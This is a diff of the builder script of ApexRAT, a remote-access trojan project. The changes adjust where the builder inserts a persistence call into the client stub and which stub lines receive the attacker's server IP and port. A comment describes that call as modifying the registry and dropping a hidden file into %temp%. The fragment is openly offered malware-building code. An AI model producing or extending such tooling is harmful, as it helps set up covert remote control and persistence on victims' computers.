@@ -10,7 +10,7 @@ import os
 #THIS FILE IS PART OF https://github.com/3verlaster/ApexRAT#
 ############################################################
 
-version = "1.1"
+version = "1.0"
 
 def dllmessage(text, error):
 	if error == True:
@@ -46,7 +46,7 @@ def builder():
 
 		source_file_path = "ApexRAT-Client.py"
 		target_file_path = "Builder/stub.py"
-		target_line_number = 60
+		target_line_number = 56
 		inserted_text = "FloraNovaLumisZephyr()" #call regedit mod. + drop file to %temp% with hiiden att.
 
 		#################################################
@@ -64,8 +64,8 @@ def builder():
 		with open(target_file_path, "r") as target_file:
 			lines = target_file.readlines()
 
-		lines[63] = f'server_ip = "{server_ip_value}"\n'
-		lines[64] = f'server_port = {server_port_value}\n'
+		lines[58] = f'server_ip = "{server_ip_value}"\n'
+		lines[59] = f'server_port = {server_port_value}\n'
 
 		with open(target_file_path, "w") as target_file:
 			target_file.writelines(lines)
